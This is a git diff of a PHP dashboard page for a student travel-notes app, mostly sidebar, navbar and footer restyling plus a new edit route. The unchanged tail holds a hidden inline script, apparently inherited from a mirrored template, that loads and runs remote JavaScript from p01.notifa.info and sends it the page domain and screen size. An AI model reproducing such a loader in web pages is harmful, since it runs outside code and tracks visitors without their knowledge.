@@ -23,7 +23,7 @@ window.location.assign('../index.php');
   <meta name="author" content=""/>
   <title>PEDULI DIRI</title>
   <!--favicon-->
-  <link rel="icon" href="../assets/images/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="../assets/images/logo.jpg" type="image/x-icon">
   <!-- simplebar CSS-->
   <link href="../assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
   <!-- Bootstrap core CSS-->
@@ -52,74 +52,71 @@ window.location.assign('../index.php');
  <div id="wrapper">
  
   <!--Start sidebar-wrapper-->
-   <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true">
-     <div class="brand-logo">
-      <a href="">
-       <img src="../assets/images/logo-icon.png" class="logo-icon" alt="logo icon">
-       <h5 class="logo-text">Peduli Diri</h5>
-     </a>
+   <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true" >
+     <div class="btn-outline-dark">
+      <a href="user.php">
+        <p></p>  
+       <img src="../assets/images/logo.jpg" class="logo-icon" alt="logo icon">   <h3 class="logo-text">Peduli Diri</h3>  
+    
+      </a>
 	 </div>
-	 <ul class="sidebar-menu do-nicescrol">
-      <li class="sidebar-header"></li>
-      <li class="sidebar-header"></li>
-      <li>
+   <hr>
+<br><br><br>
+	 <ul class="sidebar-menu do-nicescrol bg-outline-secondary">
+
       <li>
         <a href="user.php" class="waves-effect">
-          <i class="icon-home"></i> <span>Home</span> 
+        <button type="button" class="col-10 btn btn-outline-primary"><i class="icon-home"></i>Beranda</button>
+
         </a>
+
       </li>
 
-      <li class="sidebar-header"></li>
-      <li>
-
-      <li class="sidebar-header">Interface</li>
-      <li>
+<hr>
+ 
       <li>
         <a href="?url=tulis_catatan" class="waves-effect">
-          <i class="icon-note"></i> <span>Isi Data </span>
+           <button type="button" class="col-10 btn btn-outline-primary"><i class="icon-note"></i>Isi  Catatan</button>  
           
         </a>
   
       </li>
     
-  <li class="sidebar-header"></li>
-      <li>
-    
+
+    <hr>
 
       <li>
         <a href="?url=catatan_perjalanan" class="waves-effect">
-        <i class="fa fa-file"></i>
-          <span>Catatan Perjalanan</span> 
+        <button type="button" class="col-10 btn btn-outline-primary"><i class="icon-folder"></i>List Catatan</button>  
         </a>
   
       </li>
 
-      <li class="sidebar-header"></li>
-      <li>
-    
+      
+    <hr>
+
 
       <li>
         <a href="../modul/logout.php" class="waves-effect">
-        <i class="fa fa-power-off"></i>
-          <span>Logout</span> 
+        <button type="button" class="btn btn-outline-danger"><i class="icon-logout"></i>Logout</button> 
         </a>
   
       </li>
     </ul>
-	 
+
    </div>
    <!--End sidebar-wrapper-->
 
 <!--Start topbar header-->
 <header class="topbar-nav">
- <nav class="navbar navbar-expand fixed-top gradient-scooter">
+ <nav class="navbar navbar-expand fixed-top bg-secondary">
   <ul class="navbar-nav mr-auto align-items-center">
     <li class="nav-item">
       <a class="nav-link toggle-menu" href="javascript:void();">
        <i class="icon-menu menu-icon"></i>
      </a>
     </li>
-    <p> <h4>Aplikasi Catatan Perjalanan </h4></p>
+    <p> <h4 class="text-white">Aplikasi Catatan Perjalanan </h4></p>
   </ul>
      
 
@@ -132,8 +129,10 @@ window.location.assign('../index.php');
 	
   <div class="content-wrapper">
     <div class="container-fluid">
+      <br>
     <!-- Breadcrumb-->
-  
+ 
+</div>
     <div class=" mb-4 text-gray-800">
 
     <?php
@@ -148,6 +147,10 @@ window.location.assign('../index.php');
               case 'catatan_perjalanan';
               include 'catatan_perjalanan.php';
                 break;
+
+                case 'edit_catatan';
+                include 'edit_catatan.php';
+                  break;
               
               default:
                 echo "Halaman Tidak Ditemukan ";
@@ -155,10 +158,13 @@ window.location.assign('../index.php');
             }
 
           }else{
+       
+            
             echo "<br> <br>";
             echo "<center><h3>Selamat Datang Di Aplikasi Peduli Diri</h3></center>";
-            echo "<br><br> Anda Login Sebagai :<br>";
-            echo "<h4>".$_SESSION['npm']. "</h4>";
+            echo "<center><img src='../assets/images/logo.jpg' width='250' height='250' /></center>";
+            echo "<center><br><br><b> Anda Login Sebagai :</b><br></center>";
+            echo "<center><h4>".$_SESSION['npm']. "</h4> </center>";
 
           }
 
@@ -190,7 +196,7 @@ window.location.assign('../index.php');
 	<footer class="footer">
       <div class="container">
         <div class="text-center">
-          Copyright © 2018 Rocker Admin
+          Aplikasi Peduli Diri | 2022
         </div>
       </div>
     </footer>
@@ -246,5 +252,6 @@ window.location.assign('../index.php');
 
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuih2FzmamiVXBdP7rQdzhTxfpkFFtvOnyejVCSSPK6u9WcsNj8GrchwkcC0cuuN23MjWecopK9D18LKoyDfbiXPfrndpWGpPOH2fLRyh5tK5%2f2c9K0us8J%2bjf3vFsn4%2fTXFgzL766s1rvusNt%2f2awK9lOy4Vktosm3AYYGGLl5M3uaPFy1scuCQj%2f0TtP9KTGu%2baG8AY8xIwvJwZqBstW8mLUHXgBTl%2fCiejm4tW3R%2b8lXa%2bjlGl2mi3qy6h0ZR8W72goA0fM%2fheFCPwMRwWv3%2fgBJNpUwJ%2bH2t1mVHjs4ZpZ7goJxWRAK4PpOPCLgzKtOnJI%2fZInHhRwD94P7HZXLqHaKn2Dp3%2fdEJHkeaL4yuoeuu063ZBMPA0nAsB4sgvkCfWzi2EjFHA1gg77pOXVlnhhOP8kHZYxMQ4QoZOkHsqic6nVTUksRjQ3Mma4U0zDcidDMWZgPrAvo08lzOZJkkwlaTsMfMhGiEbCHIzyrFruRxowfltKRNMntpE19Ejg4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
+    
 <!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
 </html>
